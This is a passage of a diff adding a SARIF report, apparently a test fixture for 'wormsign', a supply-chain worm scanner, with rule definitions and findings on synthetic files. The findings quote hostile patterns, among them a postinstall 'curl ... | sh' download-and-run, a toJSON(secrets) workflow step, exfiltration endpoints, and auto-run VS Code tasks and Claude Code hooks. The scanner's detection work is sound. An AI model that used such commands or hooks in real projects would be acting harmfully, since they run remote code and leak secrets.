+                "text": "Part of the organization audit could not run (GitHub plan or token scope, a rate limit, a GitHub or network error, or an answer that is not the documented one); coverage is reduced."
+              },
+              "fullDescription": {
+                "text": "Part of the organization audit could not run (GitHub plan or token scope, a rate limit, a GitHub or network error, or an answer that is not the documented one); coverage is reduced."
+              },
+              "help": {
+                "text": "For a scope gap, run the audit again with a token that has the access named in the finding; for a rate limit, a GitHub or network error or an unexpected answer, run it again later."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-or-900",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SC-900",
+              "name": "file-not-checked",
+              "shortDescription": {
+                "text": "A file that decides what runs at install time or in CI (manifest, lockfile, workflow, or code or config a package manager runs, see WS-LC-004) could not be checked: unreadable, too large, binary, invalid, a symlink (to a file or package directory), or an unsupported format; a workflow in YAML the reader does not model (flow or JSON form, flow jobs or steps, aliases, merge keys, the line breaks U+0085, U+2028 and U+2029), or with a ${{ }} expression it cannot read (one outside a comment with no closing }} within 50 lines, or one written in part with YAML escapes); two such files whose paths differ only in case, Unicode form or trailing periods and spaces, of which a case-insensitive disk or Windows holds only one; a code file that could not be searched for exfiltration endpoints from the IOC list; or a workspaces pattern (package.json workspaces, pnpm-workspace.yaml packages) that can match a package the scan does not read (under an ignored path, node_modules or .git, or outside the repository)."
+              },
+              "fullDescription": {
+                "text": "A file that decides what runs at install time or in CI (manifest, lockfile, workflow, or code or config a package manager runs, see WS-LC-004) could not be checked: unreadable, too large, binary, invalid, a symlink (to a file or package directory), or an unsupported format; a workflow in YAML the reader does not model (flow or JSON form, flow jobs or steps, aliases, merge keys, the line breaks U+0085, U+2028 and U+2029), or with a ${{ }} expression it cannot read (one outside a comment with no closing }} within 50 lines, or one written in part with YAML escapes); two such files whose paths differ only in case, Unicode form or trailing periods and spaces, of which a case-insensitive disk or Windows holds only one; a code file that could not be searched for exfiltration endpoints from the IOC list; or a workspaces pattern (package.json workspaces, pnpm-workspace.yaml packages) that can match a package the scan does not read (under an ignored path, node_modules or .git, or outside the repository)."
+              },
+              "help": {
+                "text": "Make the file readable by wormsign or review it by hand. The finding is high by default because the package manager or GitHub may still act on the file."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sc-900",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-BL-001",
+              "name": "baseline-entry-expired",
+              "shortDescription": {
+                "text": "A baseline entry's expiry date has passed, so the finding is no longer suppressed."
+              },
+              "fullDescription": {
+                "text": "A baseline entry's expiry date has passed, so the finding is no longer suppressed."
+              },
+              "help": {
+                "text": "Fix the finding, or review it again and renew the baseline entry with a new expiry date."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-bl-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-RG-001",
+              "name": "registry-install-script-added",
+              "shortDescription": {
+                "text": "A package version adds or changes a preinstall/install/postinstall script compared with the version it replaces, according to the registry's copy of its manifest."
+              },
+              "fullDescription": {
+                "text": "A package version adds or changes a preinstall/install/postinstall script compared with the version it replaces, according to the registry's copy of its manifest."
+              },
+              "help": {
+                "text": "Read the new script before installing this version, and keep the previous version until you have. A reported worm adds a preinstall script to every package it republishes. False positives: a maintainer adding a native addon or a binary download. Not seen: a node-gyp build from a binding.gyp in the tarball, which the registry manifest does not show."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-rg-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-RG-002",
+              "name": "registry-provenance-dropped",
+              "shortDescription": {
+                "text": "A package version was published without a provenance attestation, while the version it replaces had one."
+              },
+              "fullDescription": {
+                "text": "A package version was published without a provenance attestation, while the version it replaces had one."
+              },
+              "help": {
+                "text": "Find out how this version was published before installing it: npm creates provenance only in GitHub Actions or GitLab CI, so a stolen token used anywhere else publishes without it. False positives: a maintainer publishing by hand, or moving to a CI system that does not create provenance. Not seen: a worm publishing from the package's own release workflow, which gets valid provenance, or from CI of its own, whose provenance names another repository (check it with npm audit signatures and the attestation)."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-rg-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-RG-003",
+              "name": "registry-new-publisher",
+              "shortDescription": {
+                "text": "A package version was published, with a token or password, by an npm account that published none of the five versions before it."
+              },
+              "fullDescription": {
+                "text": "A package version was published, with a token or password, by an npm account that published none of the five versions before it."
+              },
+              "help": {
+                "text": "Confirm with the project that this account is expected to publish. A worm publishes every package the stolen token can write, including ones its owner rarely releases. False positives: a maintainer handover or a new release manager. Publishes by a trusted publisher are not checked, since their provenance names the workflow that made them."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-rg-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OS-001",
+              "name": "osv-malicious-package",
+              "shortDescription": {
+                "text": "OSV has a malicious-package record for a locked package version: an OpenSSF malicious-packages record (id MAL-...), into which GitHub advisories of type malware are merged, or a GitHub advisory (id GHSA-...) whose CWE ids include CWE-506, embedded malicious code, which GitHub gives a hijacked release such as ua-parser-js@0.7.29. Both kinds are reported in every ecosystem that soak checks, one finding per record. Other records, such as ordinary vulnerabilities, are not reported."
+              },
+              "fullDescription": {
+                "text": "OSV has a malicious-package record for a locked package version: an OpenSSF malicious-packages record (id MAL-...), into which GitHub advisories of type malware are merged, or a GitHub advisory (id GHSA-...) whose CWE ids include CWE-506, embedded malicious code, which GitHub gives a hijacked release such as ua-parser-js@0.7.29. Both kinds are reported in every ecosystem that soak checks, one finding per record. Other records, such as ordinary vulnerabilities, are not reported."
+              },
+              "help": {
+                "text": "Treat this as a compromise: do not install this version, move the lockfile to a version without a record, and rotate the credentials (package registry, GitHub, cloud) on every machine and CI runner that installed it. The finding links to the record, which names the affected versions."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-os-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OS-900",
+              "name": "osv-not-checked",
+              "shortDescription": {
+                "text": "Some locked package versions could not be checked against OSV (request failed, unexpected response, a GitHub advisory whose record could not be read, more than 1000 versions with GitHub advisories to read in one run, or not a registry name and version, such as a git dependency); treated as failing (fail closed)."
+              },
+              "fullDescription": {
+                "text": "Some locked package versions could not be checked against OSV (request failed, unexpected response, a GitHub advisory whose record could not be read, more than 1000 versions with GitHub advisories to read in one run, or not a registry name and version, such as a git dependency); treated as failing (fail closed)."
+              },
+              "help": {
+                "text": "Run the check again when api.osv.dev is reachable. When the message says more than 1000 versions had GitHub advisories to read, the versions past that limit (in name and version order, compared as plain strings, so 1.0.10 comes before 1.0.9) were not checked: run soak on fewer or smaller lockfiles, or run it with --no-osv and check the lockfiles with another OSV client. A dependency that is not a registry version cannot be looked up: review it by hand, and baseline the finding with a justification if it is trusted."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-os-900",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OS-901",
+              "name": "osv-outage-unchecked",
+              "shortDescription": {
+                "text": "Reported only with --on-outage warn: a locked package version was not checked against OSV for malicious-package records because api.osv.dev was out for the whole run: its query batch failed after the retry in transport before any status line or with HTTP 429 or a 5xx, OSV gave no other answer in the run, and a HEAD probe of its root after the run got none either. One finding per version. Without the option these versions are in WS-OS-900, high, and so they stay under the option when OSV answered anything, for a record query that failed (it follows an answered batch), a redirect, HTTP 400 or another 4xx, an answer that does not parse or has the wrong shape, and every other reason."
+              },
+              "fullDescription": {
+                "text": "Reported only with --on-outage warn: a locked package version was not checked against OSV for malicious-package records because api.osv.dev was out for the whole run: its query batch failed after the retry in transport before any status line or with HTTP 429 or a 5xx, OSV gave no other answer in the run, and a HEAD probe of its root after the run got none either. One finding per version. Without the option these versions are in WS-OS-900, high, and so they stay under the option when OSV answered anything, for a record query that failed (it follows an answered batch), a redirect, HTTP 400 or another 4xx, an answer that does not parse or has the wrong shape, and every other reason."
+              },
+              "help": {
+                "text": "The trade-off: under --on-outage warn an outage of api.osv.dev for the entire run no longer fails the gate at the default --fail-on high, so a version with a malware record can merge while OSV is unreachable from the runner, recorded only by this finding and the run's UNVERIFIED line. The soak time still applies. Run soak again once api.osv.dev answers, before anything installs the change. A baseline never suppresses this finding: an outage is transient, and an entry for it would waive the next one."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-os-901",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-PS-001",
+              "name": "editor-auto-run-task",
+              "shortDescription": {
+                "text": "A VS Code task runs automatically (runOptions.runOn folderOpen or worktreeCreated) from .vscode/tasks.json, the tasks section of .vscode/settings.json, or a *.code-workspace file, so opening the folder runs its command and those of the tasks it depends on; or a settings file sets what tasks run with (a tasks section, or the terminal profile and environment settings tasks use). Always high, whatever the command; the message adds reasons when the command matches the lifecycle-script heuristics or an IOC file name."
+              },
+              "fullDescription": {
+                "text": "A VS Code task runs automatically (runOptions.runOn folderOpen or worktreeCreated) from .vscode/tasks.json, the tasks section of .vscode/settings.json, or a *.code-workspace file, so opening the folder runs its command and those of the tasks it depends on; or a settings file sets what tasks run with (a tasks section, or the terminal profile and environment settings tasks use). Always high, whatever the command; the message adds reasons when the command matches the lifecycle-script heuristics or an IOC file name."
+              },
+              "help": {
+                "text": "High whatever it runs: each automatic task in .vscode/tasks.json or a *.code-workspace file; each top-level dotted key there (VS Code reads \"linux.tasks\" as nested task settings); and, in .vscode/settings.json or a workspace's settings, one entry for any tasks section (nested or dotted tasks.* keys) and one for the terminal settings tasks run with (terminal.integrated.automationProfile, defaultProfile, profiles, env). Remove runOn unless needed, or review and baseline it. A task's fingerprint covers it, the tasks its dependsOn reaches and its file's global settings (the whole file for a dotted key or an unresolved or over-long dependsOn); a settings entry's covers all it lists. A script a task runs (or an npm task's script), a setting it reads with ${config:...} and settings outside the repository can change without a new finding. VS Code runs automatic tasks only in a trusted workspace; while task.allowAutomaticTasks is unset it asks once per workspace, and Allow turns them on for every trusted workspace."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-ps-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-PS-002",
+              "name": "agent-settings-command",
+              "shortDescription": {
+                "text": "A Claude Code settings file, plugin file, skill/command/subagent frontmatter or project .mcp.json makes Claude Code run something automatically: a hook of any event or type, a command setting such as statusLine or apiKeyHelper, an env entry outside a few inert settings, or an MCP server that runs a local command or a headersHelper. Always high, whatever the command; the message adds reasons when it matches the lifecycle-script heuristics or an IOC file name."
+              },
+              "fullDescription": {
+                "text": "A Claude Code settings file, plugin file, skill/command/subagent frontmatter or project .mcp.json makes Claude Code run something automatically: a hook of any event or type, a command setting such as statusLine or apiKeyHelper, an env entry outside a few inert settings, or an MCP server that runs a local command or a headersHelper. Always high, whatever the command; the message adds reasons when it matches the lifecycle-script heuristics or an IOC file name."
+              },
+              "help": {
+                "text": "High whatever it runs: every settings-file hook, command setting such as statusLine, project MCP server that runs a local command or a headersHelper, env entry other than a few inert model, limit and telemetry settings, plugin or marketplace a settings file adds, plugin file under .claude/, and skill, command or subagent file under .claude/ whose frontmatter mentions hooks or mcpServers or holds a backslash (wormsign does not parse YAML, so a mere mention counts). A symlink under .claude/ is WS-SC-900. Not reported: a skill's !`command` lines and allowed-tools, a plugin's other files, a plugin outside .claude/. Review each entry and any script it runs, then baseline it: the fingerprint covers the entry, so editing it reports it again, but the script can change unseen. claude -p and SDK sessions run most of these at once, an interactive session once you trust the folder. To keep hooks from running in a repository you have not reviewed, start Claude Code with --bare or --settings '{\"disableAllHooks\": true}'."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-ps-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "WS-PS-002",
+          "level": "error",
+          "message": {
+            "text": "Claude Code SessionStart hook runs automatically in sessions in this repository: at once under claude -p or the SDK, after the trust prompt in an interactive session: node .vscode/wormsign_marker_setup.mjs"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".claude/settings.json"
+                },
+                "region": {
+                  "startLine": 3
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "9e69c2abe85cc391e4d2159460b883f9"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-GH-007",
+          "level": "error",
+          "message": {
+            "text": "Workflow is triggered by discussion events and runs shell commands, with a self-hosted runner; anyone who can open a discussion can influence it. A reported variant used this as a command backdoor (source: https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "f2baafc7da0da370bcb57ccb0e28eca5",
+            "primaryLocationLineHash": "f2baafc7da0da370bcb57ccb0e28eca5:1"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-GH-004",
+          "level": "warning",
+          "message": {
+            "text": "Job runs on a self-hosted runner; a compromised job can persist on that machine"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                },
+                "region": {
+                  "startLine": 7
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "c9a4441b08032c8284552b7a132ebfe5"
+          },
+          "properties": {
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "WS-GH-003",
+          "level": "error",
+          "message": {
+            "text": "pull_request_target workflow checks out pull request code, running it with access to secrets"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                },
+                "region": {
+                  "startLine": 11
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "cd2f93b94b6a8edaa276fbaa062eecc9"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-GH-002",
+          "level": "error",
+          "message": {
+            "text": "Serializes the entire secrets context with toJSON(secrets)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                },
+                "region": {
+                  "startLine": 12
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "0c0b5d351b2591643d5bf7cc7ca765e1"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-GH-005",
+          "level": "error",
+          "message": {
+            "text": "A secret reaches a command that writes a file or uses the network"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                },
+                "region": {
+                  "startLine": 13
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "4caa2afdd3d41e5248016c28ecd01194"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-GH-006",
+          "level": "error",
+          "message": {
+            "text": "Targets runner WORMSIGNTEST, the name the worm registers (test wave) (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                },
+                "region": {
+                  "startLine": 15
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "698fdaff0eec26f44c40b3979c92478f"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "WS-GH-006",
+          "level": "error",
+          "message": {
+            "text": "Registers a runner named WORMSIGNTEST (test wave) (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/risky.yml"
+                },
+                "region": {
+                  "startLine": 17
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "6b579acd6d23dd8a44284056a69c47e1"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "WS-GH-001",
+          "level": "error",
+          "message": {
+            "text": "Workflow file name wormsign-marker-workflow.yml matches an IOC (test wave) (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/wormsign-marker-workflow.yml"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "ab1a0e6a76fa7b0bca60cbe115b2ee98",
+            "primaryLocationLineHash": "ab1a0e6a76fa7b0bca60cbe115b2ee98:1"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "WS-PS-001",
+          "level": "error",
+          "message": {
+            "text": "VS Code task \"Environment Setup\" runs automatically (runOn folderOpen) once the workspace is trusted and automatic tasks are allowed: node .claude/wormsign_marker_setup.mjs"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "12084f24da89585ed5c285116c4ce409"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-LK-001",
+          "level": "error",
+          "message": {
+            "text": "wormsign-test-marker@1.0.0 is listed as compromised (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "cd74b222b7484a0f8a27516f55225aac",
+            "primaryLocationLineHash": "cd74b222b7484a0f8a27516f55225aac:1"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "WS-LK-002",
+          "level": "warning",
+          "message": {
+            "text": "from-git@4.0.0 resolves from a git source (git+ssh://git@github.com/example/from-git.git#0000000000000000000000000000000000000000); git dependencies can run install scripts and are not covered by registry integrity"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "9f77bd1621cf1a28bc2616e3de217396",
+            "primaryLocationLineHash": "9f77bd1621cf1a28bc2616e3de217396:1"
+          },
+          "properties": {
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "WS-LK-002",
+          "level": "error",
+          "message": {
+            "text": "off-registry@2.0.0 resolves from evil.example.invalid, not an allowed registry host"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "2b8e59ed77693bffcb064c2bb90bcbac",
+            "primaryLocationLineHash": "2b8e59ed77693bffcb064c2bb90bcbac:1"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-LK-002",
+          "level": "error",
+          "message": {
+            "text": "plain-http@5.0.0 resolves from registry.npmjs.org over plain HTTP"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "708d4ca02530cb974a922cc47687d0a8",
+            "primaryLocationLineHash": "708d4ca02530cb974a922cc47687d0a8:1"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-LK-003",
+          "level": "warning",
+          "message": {
+            "text": "no-integrity@3.0.0 has no integrity hash in package-lock.json"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "c466fa7a297e0b5d7512a4ec1c77fbfe",
+            "primaryLocationLineHash": "c466fa7a297e0b5d7512a4ec1c77fbfe:1"
+          },
+          "properties": {
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "WS-LC-001",
+          "level": "warning",
+          "message": {
+            "text": "\"preinstall\" script runs on install for every consumer of this package: node wormsign_marker_loader.js"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "f636db8400b3074442a4566943791559"
+          },
+          "properties": {
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "WS-LC-003",
+          "level": "error",
+          "message": {
+            "text": "\"preinstall\" script runs wormsign_marker_loader.js, a payload filename reported for the test wave (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "9fbff53c16d833ae0cf7bb709b9b397e"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "WS-LC-001",
+          "level": "warning",
+          "message": {
+            "text": "\"postinstall\" script runs on install for every consumer of this package: curl -s https://example.invalid/x | sh"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "fcd1d4ab4a377936fe5dc7392a06dc38"
+          },
+          "properties": {
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "WS-LC-002",
+          "level": "error",
+          "message": {
+            "text": "\"postinstall\" script pipes a download into a shell or interpreter: curl -s https://example.invalid/x | sh"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "91341746e8f1efc95df1501ff1f6ca37"
+          },
+          "properties": {
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "WS-EX-001",
+          "level": "warning",
+          "message": {
+            "text": "Hardcoded webhook.site endpoint https://webhook.site/00000000-0000-0000-0000-000000000000; verify it is not a data sink"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/exfil.js"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "cd1da6c94f49ac79be2e4059bfdcf984"
+          },
+          "properties": {
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "WS-EX-002",
+          "level": "error",
+          "message": {
+            "text": "Contains exfiltration endpoint wormsign-marker.invalid/collect reported for the test wave (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/exfil.js"
+                },
+                "region": {
+                  "startLine": 3
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "21a17ac2600c08173b1ca8fc6e976b32"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "WS-FS-001",
+          "level": "error",
+          "message": {
+            "text": "SHA-256 matches wormsign_marker_loader.js from the test wave (source: https://example.test/synthetic-ioc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "wormsign_marker_loader.js"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "wormsign/v1": "4e04228376f12cee70f444656bd8ec97",
+            "primaryLocationLineHash": "4e04228376f12cee70f444656bd8ec97:1"
+          },
+          "properties": {
+            "severity": "critical"
+          }
+        }
+      ]
+    }
+  ]
+}
